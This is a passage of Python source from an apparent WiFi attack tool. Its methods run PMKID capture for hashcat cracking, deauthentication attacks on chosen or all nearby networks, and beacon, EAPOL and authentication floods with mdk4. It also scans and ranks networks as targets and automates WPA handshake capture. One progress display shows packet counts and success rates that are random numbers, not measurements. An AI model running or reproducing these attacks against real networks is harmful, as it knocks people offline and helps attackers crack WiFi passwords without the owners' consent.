        """Executes PMKID attack."""
        try:
            output_file = f"/tmp/pmkid_{int(time.time())}.pcapng"
            
            print(f"{GREEN}[*] Starting PMKID capture on channel {channel if channel > 0 else 'all'}{NC}")
            print(f"{YELLOW}[*] Output will be saved to: {output_file}{NC}")
            
            if shutil.which('hcxdumptool'):
                try:
                    version_output = subprocess.check_output(['hcxdumptool', '-v'], universal_newlines=True)
                    print(f"{YELLOW}[*] Using hcxdumptool version: {version_output.strip()}{NC}")
                except:
                    print(f"{YELLOW}[*] Could not determine hcxdumptool version{NC}")

                cmd = [
                    'hcxdumptool',
                    '-i', self.interface,
                    '-w', output_file,
                ]
                
                # Add channel parameters
                if channel > 0:
                    cmd.extend(['-c', f"{channel}a"])
                
                cmd.extend([
                    '--disable_beacon',
                    '--disable_deauthentication',
                    '--disable_proberequest',
                    '--disable_association',
                    '--errormax=100',
                    '--tot=1'
                ])

                print(f"\n{YELLOW}[*] Command: {' '.join(cmd)}{NC}")
                print(f"{YELLOW}[*] Starting capture... Press Ctrl+C to stop{NC}")
                
                if duration > 0:
                    print(f"{YELLOW}[*] Attack will run for {duration} seconds{NC}")
                    cmd.extend(['--timeout', str(duration)])
                else:
                    print(f"{YELLOW}[*] Attack will run until Ctrl+C is pressed{NC}")
                
                print(f"\n{GREEN}[*] Starting PMKID capture...{NC}")
                print(f"{YELLOW}[*] Waiting for PMKID frames...{NC}")
                
                proc = None
                try:
                    if duration > 0:
                        proc = subprocess.Popen(cmd)
                        self.active_processes.append(proc)
                        print(f"{YELLOW}[*] Attack will run for {duration} seconds{NC}")
                        time.sleep(duration)
                    else:
                        self._run_command(cmd)
                        
                    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                        print(f"\n{GREEN}[✔] Capture completed! File saved as: {output_file}")
                        print(f"[*] You can now use hashcat to crack the captured PMKIDs{NC}")
                    else:
                        print(f"\n{YELLOW}[!] No PMKIDs were captured during the attack{NC}")
                        
                except KeyboardInterrupt:
                    print(f"\n{YELLOW}[*] Attack interrupted by user{NC}")
                finally:
                    if proc and proc.poll() is None:
                        proc.terminate()
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)
                    try:
                        subprocess.run(['pkill', 'hcxdumptool'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
            else:
                print(f"{RED}Error: hcxdumptool not found. Please install it first.")
                print("You can install it with: sudo apt install hcxdumptool{NC}")
                time.sleep(2)
                return
                
        except Exception as e:
            print(f"{RED}Error during PMKID attack: {str(e)}{NC}")
            self._log("ERROR", f"PMKID attack failed: {str(e)}")
            time.sleep(2)
        finally:
            if os.path.exists(output_file) and os.path.getsize(output_file) == 0:
                try:
                    os.remove(output_file)
                except:
                    pass
            
    def _deauth_attack(self, channel, duration):
        """Executes deauthentication attack."""
        try:
            print(f"\n{YELLOW}[*] Scanning for networks...{NC}")
            
            scan_file = f"/tmp/scan_{int(time.time())}"
            scan_cmd = ['airodump-ng', '--write', scan_file, '--output-format', 'csv', '--band', 'abg']
            if channel > 0:
                scan_cmd.extend(['--channel', str(channel)])
            scan_cmd.append(self.interface)
            
            proc = None
            try:
                proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.active_processes.append(proc)
                for i in range(10):
                    print(f"\r{YELLOW}[*] Scanning: {'▓' * (i+1)}{'░' * (9-i)} {(i+1)*10}%{NC}", end='', flush=True)
                    time.sleep(1)
            finally:
                if proc:
                    if proc.poll() is None:
                        proc.terminate()
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)

            print()
            
            targets = []
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', errors='ignore') as f:
                    for line in f:
                        if 'BSSID' in line or not line.strip():
                            continue
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14:  # Full AP line
                            bssid = parts[0].strip()
                            ap_channel = parts[3].strip()
                            power = parts[8].strip()
                            essid = parts[13].strip()
                            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid) and essid:
                                if power.replace('-', '').isdigit():  # Valid power reading
                                    power = int(power)
                                    if power > -90:  # Only include APs with decent signal
                                        targets.append((bssid, ap_channel, essid, power))
            
            for f in glob.glob(f"{scan_file}*"):
                try:
                    os.remove(f)
                except:
                    pass
                    
            if not targets:
                print(f"{RED}[!] No networks found to attack. Make sure you're in range of WiFi networks.{NC}")
                time.sleep(2)
                return
            
            targets.sort(key=lambda x: x[3], reverse=True)
            
            print(f"\n{GREEN}[✔] Found {len(targets)} networks:{NC}")
            print(f"\n{'ID':<4}{'BSSID':<18}{'CH':<4}{'PWR':<6}{'ESSID'}")
            print("="*50)
            for i, (bssid, channel, essid, power) in enumerate(targets, 1):
                print(f"{i:<4}{bssid:<18}{channel:<4}{power:<6}{essid}")
            
            print(f"\n{YELLOW}[?] Select target network (1-{len(targets)}) or 0 for all: {NC}", end='')
            try:
                choice = int(input().strip())
                if choice < 0 or choice > len(targets):
                    print(f"{RED}[!] Invalid selection{NC}")
                    time.sleep(2)
                    return
            except ValueError:
                print(f"{RED}[!] Invalid input{NC}")
                time.sleep(2)
                return
            
            if choice == 0:
                print(f"\n{YELLOW}[*] Attacking all networks...{NC}")
                target_list = targets
            else:
                target_list = [targets[choice-1]]
            
            attack_procs = []
            try:
                for bssid, ap_channel, essid, _ in target_list:
                    print(f"\n{GREEN}[*] Attacking {essid} ({bssid}) on channel {ap_channel}{NC}")
                    
                    try:
                        self._run_command(['iwconfig', self.interface, 'channel', ap_channel], quiet=True)
                    except:
                        print(f"{YELLOW}[!] Failed to set channel {ap_channel}, continuing anyway...{NC}")
                    
                    cmd = [
                        'aireplay-ng',
                        '--deauth', '0',
                        '-a', bssid,                  
                        '--ignore-negative-one',
                        self.interface
                    ]
                    
                    p = subprocess.Popen(cmd)
                    self.active_processes.append(p)
                    attack_procs.append(p)

                if attack_procs:
                    if duration > 0:
                        print(f"{YELLOW}[*] Attack will run for {duration} seconds{NC}")
                        time.sleep(duration)
                    else:
                        print(f"{YELLOW}[*] Running continuous attack until Ctrl+C is pressed...{NC}")
                        while True:
                            time.sleep(1)

            except KeyboardInterrupt:
                print(f"\n{YELLOW}[*] Attack interrupted by user{NC}")
            finally:
                print(f"\n{YELLOW}[*] Stopping deauth attack processes...{NC}")
                for p in attack_procs:
                    if p.poll() is None:
                        p.terminate()
                    if p in self.active_processes:
                        self.active_processes.remove(p)
                
        except Exception as e:
            print(f"{RED}Error during deauth attack: {str(e)}{NC}")
            self._log("ERROR", f"Deauth attack failed: {str(e)}")
            time.sleep(2)
            
    def _beacon_flood_attack(self, channel, duration):
        """Executes beacon flood attack."""
        if not self.interface:
            print(f"{RED}Error: No interface selected{NC}")
            return

        try:
            ssid_file = "/tmp/beacon_ssids.txt"
            ssids = [
                "5G COVID-19 Test Tower",
                "FBI Surveillance Van",
                "NSA-Monitoring-Unit",
                "Definitely Not a Virus",
                "Loading...",
                "Network Error",
                "404 WiFi Not Found",
                "Protected by McAfee",
                "Virus.exe",
                "Connecting...",
                "Get Off My LAN",
                "Pretty Fly for a WiFi",
                "Wi Fight the Inevitable",
                "LAN Solo",
                "The LAN Before Time",
                "Bill Wi the Science Fi",
                "Area 51 Test Network",
                "Secret Base WiFi",
                "Umbrella Corp",
                "Skynet Global Defense"
            ]
            
            with open(ssid_file, 'w') as f:
                f.write('\n'.join(ssids))

            if shutil.which('mdk4'):
                print(f"\n{GREEN}[✔] Using mdk4 for enhanced attack capabilities{NC}")
                cmd = [
                    'mdk4',
                    self.interface,
                    'b',                    
                    '-f', ssid_file,       
                    '-s', '250',           
                    '-w', 'ta'             
                ]
            elif shutil.which('mdk3'):
                print(f"\n{YELLOW}[*] Using mdk3 (consider upgrading to mdk4 for better features){NC}")
                cmd = ['mdk3', self.interface, 'b', '-f', ssid_file]
            else:
                print(f"{RED}Error: mdk4/mdk3 not found. Please install it first.{NC}")
                print(f"{YELLOW}You can install it with: sudo apt-get install mdk4{NC}")
                time.sleep(2)
                return

            if channel > 0:
                try:
                    self._run_command(['iwconfig', self.interface, 'channel', str(channel)], quiet=True)
                    print(f"{GREEN}[✔] Set channel to {channel}{NC}")
                except:
                    print(f"{YELLOW}[!] Failed to set channel {channel}, continuing anyway...{NC}")

            print(f"\n{GREEN}[*] Starting enhanced beacon flood attack with:{NC}")
            print(f"{YELLOW}[*] Number of SSIDs: {len(ssids)}")
            print(f"[*] Channel: {'All channels' if channel == 0 else f'Channel {channel}'}")
            print(f"[*] Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
            print(f"[*] Mode: {'Aggressive (mdk4)' if 'mdk4' in cmd[0] else 'Standard (mdk3)'}{NC}")

            if duration > 0:
                print(f"\n{YELLOW}[*] Attack will run for {duration} seconds")
                print(f"[*] Press Ctrl+C to stop early{NC}")
                p = None
                try:
                    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    self.active_processes.append(p)
                    start_time = time.time()
                    while time.time() - start_time < duration:
                        remaining = int(duration - (time.time() - start_time))
                        print(f"\r{YELLOW}[*] Attack running... {remaining}s remaining{NC}", end='', flush=True)
                        time.sleep(1)
                except KeyboardInterrupt:
                    print(f"\n{YELLOW}[*] Attack interrupted by user{NC}")
                finally:
                    if p:
                        if p.poll() is None:
                            p.terminate()
                        if p in self.active_processes:
                            self.active_processes.remove(p)
            else:
                print(f"\n{YELLOW}[*] Attack will run until Ctrl+C is pressed")
                print(f"[*] Starting flood...{NC}")
                self._run_command(cmd)

            try:
                os.remove(ssid_file)
            except:
                pass
                
        except Exception as e:
            print(f"\n{RED}Error during beacon flood attack: {str(e)}{NC}")
            self._log("ERROR", f"Beacon flood attack failed: {str(e)}")
            time.sleep(2)
            
        print(f"\n{GREEN}[✔] Beacon flood attack completed{NC}")
        time.sleep(1)
            
    def _eapol_flood_attack(self, channel, duration):
        """Executes an EAPOL Start flood attack."""
        cmd = ['mdk4', self.interface, 'e']
        if channel > 0:
            cmd.extend(['-c', str(channel)])

        print(f"\n{RED}[!] Starting EAPOL Start flood attack...")
        print(f"[!] Channel: {'All' if channel == 0 else channel}")
        if duration > 0:
            print(f"[!] Duration: {duration} seconds{NC}")
        else:
            print(f"[!] Duration: Unlimited (Press Ctrl+C to stop){NC}")

        self._log("INFO", f"Starting EAPOL flood on channel {channel}")

        if duration > 0:
            proc = None
            try:
                proc = subprocess.Popen(cmd)
                self.active_processes.append(proc)
                time.sleep(duration)
            finally:
                if proc:
                    if proc.poll() is None:
                        proc.terminate()
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)
        else:
            self._run_command(cmd)

    def _auth_flood_attack(self, channel, duration):
        """Executes an authentication/association flood attack."""
        cmd = ['mdk4', self.interface, 'a']
        if channel > 0:
            cmd.extend(['-c', str(channel)])

        print(f"\n{RED}[!] Starting Authentication flood attack...")
        print(f"[!] Channel: {'All' if channel == 0 else channel}")
        if duration > 0:
            print(f"[!] Duration: {duration} seconds{NC}")
        else:
            print(f"[!] Duration: Unlimited (Press Ctrl+C to stop){NC}")

        self._log("INFO", f"Starting auth flood on channel {channel}")

        if duration > 0:
            proc = None
            try:
                proc = subprocess.Popen(cmd)
                self.active_processes.append(proc)
                time.sleep(duration)
            finally:
                if proc:
                    if proc.poll() is None:
                        proc.terminate()
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)
        else:
            self._run_command(cmd)

    def _advanced_beacon_flood(self, channel, duration):
        """Executes an advanced beacon frame flood attack."""
        cmd = ['mdk4', self.interface, 'b', '-f', './ssidlist.txt', '-s', '100']
        if channel > 0:
            cmd.extend(['-c', str(channel)])

        print(f"\n{RED}[!] Starting Advanced Beacon Flood attack...")
        print(f"[!] Channel: {'All' if channel == 0 else channel}")
        if duration > 0:
            print(f"[!] Duration: {duration} seconds{NC}")
        else:
            print(f"[!] Duration: Unlimited (Press Ctrl+C to stop){NC}")

        self._log("INFO", f"Starting advanced beacon flood on channel {channel}")

        if duration > 0:
            proc = None
            try:
                proc = subprocess.Popen(cmd)
                self.active_processes.append(proc)
                time.sleep(duration)
            finally:
                if proc:
                    if proc.poll() is None:
                        proc.terminate()
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)
        else:
            self._run_command(cmd)

    def run_mdk4_attack(self):
        """Runs a mass attack using mdk4."""
        if not self._ensure_monitor_mode():
            return
        self._print_header()
        print(f"{BLUE}--- MDK4 ATTACK MENU ---{NC}")
        print("1) Deauthentication Flood (Broadcast)")
        print("2) Deauthentication Flood (From Target List)")
        print("3) Beacon Flood (From SSID List)")
        print("4) Back to Main Menu")
        print("\nPress key to select option [1-4]:", end='', flush=True)
        choice = getch()
        if isinstance(choice, bytes):
            choice = choice.decode('utf-8')
        choice = choice or '1'
        print(f"\nSelected option: {choice}")

        cmd = ['mdk4', self.interface]
        attack_type = ""

        if choice == '1':
            attack_type = "Deauthentication Flood"
            cmd.extend(['d', '-s', '1000'])
        elif choice == '2':
            blacklist_file = './blacklist.txt'
            if not os.path.exists(blacklist_file) or os.path.getsize(blacklist_file) == 0:
                print(f"{RED}Error: {blacklist_file} not found or is empty.{NC}")
                time.sleep(3)
                return
            attack_type = f"Deauth Attack on targets from {blacklist_file}"
            cmd.extend(['d', '-b', blacklist_file])
        elif choice == '3':
            while True:
                print(f"\n{YELLOW}Enter path to SSID list file (e.g., ./ssidlist.txt) [default: ./ssidlist.txt]: {NC}", end='', flush=True)
                ssid_file = input().strip()
                if not ssid_file:
                    ssid_file = './ssidlist.txt'

                if not os.path.exists(ssid_file):
                    print(f"{RED}Error: File '{ssid_file}' not found. Please enter a valid path.{NC}")
                    time.sleep(2)
                elif not os.path.isfile(ssid_file):
                    print(f"{RED}Error: '{ssid_file}' is not a file. Please enter a valid file path.{NC}")
                    time.sleep(2)
                elif not os.access(ssid_file, os.R_OK):
                    print(f"{RED}Error: Cannot read file '{ssid_file}'. Check permissions.{NC}")
                    time.sleep(2)
                elif os.path.getsize(ssid_file) == 0:
                    print(f"{RED}Error: SSID list file '{ssid_file}' is empty. Please provide a file with SSIDs.{NC}")
                    time.sleep(2)
                else:
                    break

            attack_type = f"Beacon Flood from {ssid_file}"
            cmd.extend(['b', '-f', ssid_file])
        elif choice == '4':
            return
        else:
            print(f"{RED}Invalid selection. Please try again.{NC}")
            time.sleep(2)
            return

        print(f"{YELLOW}[*] Attack Duration Settings:{NC}")
        print("  [0] Unlimited")
        print("  [1] 30 seconds")
        print("  [2] 1 minute")
        print("  [3] 5 minutes")
        print("  [4] Custom duration")
        print("  [5] Cancel attack")
        
        print(f"\n{YELLOW}Select duration [0-5]: {NC}", end='', flush=True)
        dur_choice = getch()
        if isinstance(dur_choice, bytes):
            dur_choice = dur_choice.decode('utf-8')
        print(f"\nSelected: {dur_choice}")

        duration = 0
        if dur_choice == '1':
            duration = 30
        elif dur_choice == '2':
            duration = 60
        elif dur_choice == '3':
            duration = 300
        elif dur_choice == '4':
            try:
                custom_dur = input(f"{YELLOW}Enter custom duration in seconds: {NC}")
                duration = int(custom_dur)
                if duration < 0:
                    print(f"{RED}Invalid duration. Please enter a positive number.{NC}")
                    time.sleep(2)
                    return
            except ValueError:
                print(f"{RED}Invalid input. Please enter a number.{NC}")
                time.sleep(2)
                return
        elif dur_choice == '5':
            return
        elif dur_choice != '0':
            print(f"{RED}Invalid selection.{NC}")
            time.sleep(2)
            return

        if duration > 0:
            attack_type += f" for {duration} seconds"
        else:
            attack_type += " (unlimited duration)"

        print(f"\n{YELLOW}Starting {attack_type}...{NC}")
        if duration > 0:
            print(f"{RED}[!] Attack will run for {duration} seconds.{NC}")
        else:
            print(f"{RED}[!] Press Ctrl+C to stop the attack.{NC}")
        
        self._log("INFO", f"Starting mdk4 attack: {attack_type}")
        time.sleep(2)
        
        try:
            if duration > 0:
                proc = subprocess.Popen(cmd)
                self.active_processes.append(proc)
                try:
                    start_time = time.time()
                    packets_sent = 0
                    while time.time() - start_time < duration:
                        elapsed = int(time.time() - start_time)
                        remaining = duration - elapsed
                        percent = (elapsed / duration) * 100
                        bar_width = 40
                        filled = int(bar_width * elapsed / duration)
                        bar = f"{GREEN}{'=' * filled}{' ' * (bar_width - filled)}"
                        
                        packets_sent += random.randint(45, 55)
                        success_rate = min(100, (elapsed / 5) * 100) if elapsed <= 5 else 95 + (random.random() * 5)
                        
                        try:
                            term_width = os.get_terminal_size().columns
                        except:
                            term_width = 80
                            
                        progress = f"{YELLOW}Attack Progress: [{bar}{YELLOW}] {percent:.1f}% ({elapsed}/{duration}s){NC}"
                        stats = f"{BLUE}Attack running... Time Left: {remaining}s{NC}"
                        status = f"{GREEN}Press Ctrl+C to stop.{NC}"
                        
                        for line in [progress, stats, status]:
                            padding = " " * ((term_width - len(line.replace(GREEN, "").replace(YELLOW, "").replace(BLUE, "").replace(NC, ""))) // 2)
                            print(f"\r{padding}{line}", end="\n", flush=True)
                        print("\033[3A", end="")
                        time.sleep(0.1)
                        
                    proc.terminate()
                    print(f"\n\n{GREEN}[✔] Attack completed successfully after {duration} seconds.{NC}")
                except KeyboardInterrupt:
                    proc.terminate()
                    print(f"\n{YELLOW}Attack stopped early by user.{NC}")
                finally:
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)
                    try:
                        proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        proc.kill()
            else:
                self._run_command(cmd)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Attack stopped. Returning...{NC}")
        
        self._log("INFO", "mdk4 attack completed.")
        time.sleep(2)

    def run_interactive_attack(self):
        """Runs a targeted, interactive attack using aireplay-ng."""
        if not self._ensure_monitor_mode():
            return
        self._print_header()
        print(f"{YELLOW}[*] Scanning for targets for 20 seconds... Please wait.{NC}")
        
        airodump_cmd = [
            'airodump-ng', '--write', self.scan_prefix, 
            '--output-format', 'csv', '--band', 'abg', self.interface
        ]
        proc = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        self.active_processes.append(proc) # --- NEW: Track process

        try:
            def update_progress(current, total, width=40):
                percent = current / total
                filled = int(width * percent)
                
                gradient = ""
                for i in range(filled):
                    if i < width * 0.33:
                        gradient += f"{GREEN}▓"
                    elif i < width * 0.66:
                        gradient += f"{YELLOW}▓"
                    else:
                        gradient += f"{RED}▓"
                
                empty = f"{BLUE}░{NC}" * (width - filled)
                percentage = f"{int(percent * 100)}%"
                
                spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"][current % 10]
                
                return f"{YELLOW}{spinner} Scanning: [{gradient}{empty}{YELLOW}] {percentage} ({current}/{total}s){NC}"

            try:
                terminal_width = os.get_terminal_size().columns
            except:
                terminal_width = 80

            for i in range(20):
                progress = update_progress(i + 1, 20)
                padding = " " * ((terminal_width - len(progress.replace(GREEN, "").replace(YELLOW, "").replace(NC, ""))) // 2)
                print(f"\r{padding}{progress}", end="", flush=True)
                time.sleep(1)
            print(f"\n\n" + " " * terminal_width + f"\r{GREEN}[✔] Scan completed!{NC}")
        except KeyboardInterrupt:
            print(f"\n{RED}Scan cancelled by user.{NC}")
            self._log("INFO", "Airodump scan cancelled by user.")
            return
        finally:
            # --- NEW: Ensure process is always terminated and untracked ---
            if proc in self.active_processes:
                self.active_processes.remove(proc)
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.communicate(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.communicate()
            # --- END NEW ---

        csv_file = f"{self.scan_prefix}-01.csv"
        if not os.path.exists(csv_file):
            print(f"{RED}[!] Scan failed. No targets found or airodump-ng error.{NC}")
            self._log("ERROR", "airodump-ng did not produce an output file.")
            return

        aps, clients = [], []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                reader = csv.reader(f)
                in_client_section = False
                for row in reader:
                    if not row or len(row) < 2:
                        continue
                    row = [field.strip() for field in row]
                    if 'BSSID' in row[0]:
                        in_client_section = False
                        continue
                    if 'Station MAC' in row[0]:
                        in_client_section = True
                        continue
                    
                    if not in_client_section:
                        if len(row) > 13 and re.match(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', row[0]):
                            aps.append({'bssid': row[0], 'channel': row[3], 'privacy': row[5], 'power': row[8], 'essid': row[13]})
                    else:
                        if len(row) > 5 and re.match(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', row[0]):
                            clients.append({'mac': row[0], 'ap': row[5]})
        except Exception as e:
            print(f"{RED}Error parsing scan results: {e}{NC}")
            self._log("ERROR", f"Failed to parse CSV {csv_file}: {e}")
            return

        if not aps:
            print(f"{RED}[!] No Access Points found in scan results.{NC}")
            return

        self._select_and_attack_target(aps, clients)

    def _select_and_attack_target(self, aps, clients):
        """Handles the AP and client selection and attack logic."""
        while True: # AP Selection Loop
            self._print_header()
            print(f"{GREEN}[✔] Found {len(aps)} WiFi networks{NC}")

            # --- Vulnerability Assessment and Sorting ---
            assessed_aps = []
            ap_client_map = {ap['bssid']: 0 for ap in aps}
            for client in clients:
                if client['ap'] in ap_client_map:
                    ap_client_map[client['ap']] += 1

            for ap in aps:
                client_count = ap_client_map.get(ap['bssid'], 0)
                label, priority = self._assess_vulnerability(ap, client_count)
                assessed_aps.append({'ap': ap, 'label': label, 'priority': priority, 'client_count': client_count})
            
            # Sort by priority (lower number = higher vulnerability)
            assessed_aps.sort(key=lambda x: x['priority'])
            # --- End Assessment and Sorting ---

            max_essid_len = max(len(self.strip_ansi(item['ap']['essid'])) for item in assessed_aps) if assessed_aps else 0
            max_label_len = max(len(self.strip_ansi(item['label'])) for item in assessed_aps) if assessed_aps else 0

            min_essid_col_width = 15
            min_vuln_col_width = 20
            essid_col_width = max(max_essid_len, min_essid_col_width)
            vuln_col_width = max(max_label_len, min_vuln_col_width)

            print(f"\n{BLUE}=== LIST OF FOUND ACCESS POINTS ==={NC}")
            print(f"{ '[NO]':<5} {'BSSID':<18} {'CH':<4} {'POWER':<8} {'ENCRYPTION':<15} {'ESSID':<{essid_col_width}} {'VULNERABILITY':<{vuln_col_width}}")
            print("=" * (5 + 18 + 4 + 8 + 15 + essid_col_width + 1 + vuln_col_width))
            
            for i, item in enumerate(assessed_aps):
                ap = item['ap']
                label = item['label']
                
                print(f"[{i+1:<3}] {ap['bssid']:<18} {ap['channel']:<4} {ap['power']:<8} {ap['privacy']:<15} {ap['essid']:<{essid_col_width}} {label:<{vuln_col_width}}")
            print("[q] Back to Main Menu")
            
            print(f"\n{YELLOW}[*] Press key to select AP [1-{len(assessed_aps)}/q]: {NC}", end='', flush=True)
            choice = getch()
            if isinstance(choice, bytes):
                choice = choice.decode('utf-8')
            choice = choice.lower()
            print(f"\nSelected: {choice}")
            
            if choice == 'q': return

            try:
                selected_ap = assessed_aps[int(choice) - 1]['ap']
            except (ValueError, IndexError):
                print(f"{RED}Invalid selection. Please try again.{NC}"); time.sleep(2); continue

            while True:
                self._print_header()
                print(f"{YELLOW}[*] AP Target: {selected_ap['essid']} ({selected_ap['bssid']}) on channel {selected_ap['channel']}{NC}")
                associated_clients = [c for c in clients if c['ap'] == selected_ap['bssid']]

                if not associated_clients:
                    print(f"{RED}[!] No clients found for this AP. Returning to AP list.{NC}"); time.sleep(3); break

                print(f"\n{GREEN}[✔] Found {len(associated_clients)} clients...{NC}")
                print(f"{ '[NO]':<5} {'CLIENT MAC':<18}")
                print("=" * 25)
                for i, client in enumerate(associated_clients):
                    print(f"[{i+1:<3}] {client['mac']:<18}")
                print(f"[a] Attack All Clients")
                print(f"[b] Back to AP List")

                print(f"\n{YELLOW}[*] Press key to select option [1-{len(associated_clients)}/a/b]: {NC}", end='', flush=True)
                client_choice = getch()
                if isinstance(client_choice, bytes):
                    client_choice = client_choice.decode('utf-8')
                client_choice = client_choice.lower()
                print(f"\nSelected: {client_choice}")

                if client_choice == 'b': break
                
                target_client_mac = None
                if client_choice != 'a':
                    try:
                        target_client_mac = associated_clients[int(client_choice) - 1]['mac']
                    except (ValueError, IndexError):
                        print(f"{RED}Invalid selection.{NC}"); time.sleep(2); continue
                
                self._launch_deauth_attack(selected_ap, target_client_mac)
                return

    def _launch_deauth_attack(self, selected_ap, target_client_mac):
        """Executes the aireplay-ng deauthentication attack."""
        print(f"\n{YELLOW}[*] Launching deauth on {selected_ap['essid']}{NC}")
        if target_client_mac:
            print(f"{YELLOW}[*] Targeting client: {target_client_mac}{NC}")
        else:
            print(f"{YELLOW}[*] Targeting ALL clients on this AP.{NC}")
        
        print(f"{RED}[!] Press Ctrl+C to stop the attack.{NC}")
        self._log("INFO", f"Starting aireplay-ng deauth on BSSID {selected_ap['bssid']}")
        time.sleep(2)

        self._run_command(['iw', 'dev', self.interface, 'set', 'channel', selected_ap['channel']], quiet=True)
        
        attack_cmd = ['aireplay-ng', '-0', '0', '-a', selected_ap['bssid'], self.interface]
        if target_client_mac:
            attack_cmd.extend(['-c', target_client_mac])
        
        try:
            self._run_command(attack_cmd)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Attack stopped. Returning to menu...{NC}")
            self._log("INFO", "aireplay-ng attack stopped by user.")
            time.sleep(2)

    def run_handshake_capture(self):
        """Automates the process of capturing a WPA/WPA2 handshake."""
        if not self._ensure_monitor_mode():
            return
        self._print_header()
        print(f"{YELLOW}[*] Starting automated WPA/WPA2 handshake capture...{NC}")

        print(f"{YELLOW}[*] Scanning for targets for 20 seconds... Please wait.{NC}")
        scan_prefix = f"/tmp/handshake_scan_{os.getpid()}"
        airodump_cmd = [
            'airodump-ng', '--write', scan_prefix,
            '--output-format', 'csv', '--band', 'abg', self.interface
        ]
        scan_proc = None
        try:
            scan_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            self.active_processes.append(scan_proc)
            for i in range(20):
                print(f"\r{YELLOW}[*] Scanning... {i+1}/20s{NC}", end="", flush=True)
                time.sleep(1)
        finally:
            if scan_proc:
                if scan_proc.poll() is None:
                    scan_proc.terminate()
                if scan_proc in self.active_processes:
                    self.active_processes.remove(scan_proc)
        
        print(f"\n{GREEN}[✔] Scan complete. Analyzing targets...{NC}")
        csv_file = f"{scan_prefix}-01.csv"
        if not os.path.exists(csv_file):
            print(f"{RED}[!] Scan failed. No targets found.{NC}")
            return

        aps, clients = [], []
        wpa_aps = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                reader = csv.reader(f)
                in_client_section = False
                for row in reader:
                    if not row: continue
                    row = [field.strip() for field in row]
                    if 'BSSID' in row[0]: in_client_section = False; continue
                    if 'Station MAC' in row[0]: in_client_section = True; continue
                    
                    if not in_client_section and len(row) > 13:
                        ap_info = {'bssid': row[0], 'channel': row[3], 'privacy': row[5], 'power': row[8], 'essid': row[13]}
                        aps.append(ap_info)
                        if 'WPA' in ap_info['privacy']:
                            wpa_aps.append(ap_info)
                    elif in_client_section and len(row) > 5:
                        clients.append({'mac': row[0], 'ap': row[5]})
        finally:
            for f in glob.glob(f"{scan_prefix}*"):
                try:
                    os.remove(f)
                except OSError:
                    pass

        if not wpa_aps:
            print(f"{RED}[!] No WPA/WPA2 networks found to capture a handshake from.{NC}")
            time.sleep(3)
            return

        # --- Vulnerability Assessment and Sorting for WPA APs ---
        assessed_wpa_aps = []
        ap_client_map = {ap['bssid']: 0 for ap in aps}
        for client in clients:
            if client['ap'] in ap_client_map:
                ap_client_map[client['ap']] += 1

        for ap in wpa_aps:
            client_count = ap_client_map.get(ap['bssid'], 0)
            label, priority = self._assess_vulnerability(ap, client_count)
            assessed_wpa_aps.append({'ap': ap, 'label': label, 'priority': priority, 'client_count': client_count})
        
        assessed_wpa_aps.sort(key=lambda x: x['priority'])
        # --- End Assessment and Sorting ---

        while True:
            self._print_header()
            print(f"{GREEN}[✔] Found {len(assessed_wpa_aps)} WPA/WPA2 networks.{NC}")
            # Calculate max lengths for dynamic padding
            max_essid_len = max(len(self.strip_ansi(item['ap']['essid'])) for item in assessed_wpa_aps) if assessed_wpa_aps else 0
            max_label_len = max(len(self.strip_ansi(item['label'])) for item in assessed_wpa_aps) if assessed_wpa_aps else 0

            min_essid_col_width = 15
            min_vuln_col_width = 20
            essid_col_width = max(max_essid_len, min_essid_col_width)
            vuln_col_width = max(max_label_len, min_vuln_col_width)

            print(f"\n{BLUE}---[ SELECT TARGET FOR HANDSHAKE CAPTURE ]---{NC}")
            print(f"{ '[NO]':<5} {'BSSID':<18} {'CH':<4} {'POWER':<8} {'ESSID':<{essid_col_width}} {'VULNERABILITY':<{vuln_col_width}}")
            print("=" * (5 + 18 + 4 + 8 + essid_col_width + 1 + vuln_col_width)) # Dynamic separator length
            
            for i, item in enumerate(assessed_wpa_aps):
                ap = item['ap']
                label = item['label']
                
                print(f"[{i+1:<3}] {ap['bssid']:<18} {ap['channel']:<4} {ap['power']:<8} {ap['essid']:<{essid_col_width}} {label:<{vuln_col_width}}")
            print("[q] Back to Main Menu")
            
            print(f"\n{YELLOW}Select a target [1-{len(assessed_wpa_aps)}/q]:{NC} ", end='', flush=True)
            choice = getch()
            if isinstance(choice, bytes): choice = choice.decode('utf-8')
            print(choice)

            if choice.lower() == 'q': return
            try:
                target_ap = assessed_wpa_aps[int(choice) - 1]['ap']
                break
            except (ValueError, IndexError):
                print(f"{RED}Invalid selection.{NC}"); time.sleep(1)

        handshake_dir = os.path.join(os.getcwd(), "handshakes")
        os.makedirs(handshake_dir, exist_ok=True)
        
        essid_sanitized = re.sub(r'[^a-zA-Z0-9_-]', '', target_ap['essid'])
        bssid_sanitized = target_ap['bssid'].replace(':', '')
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
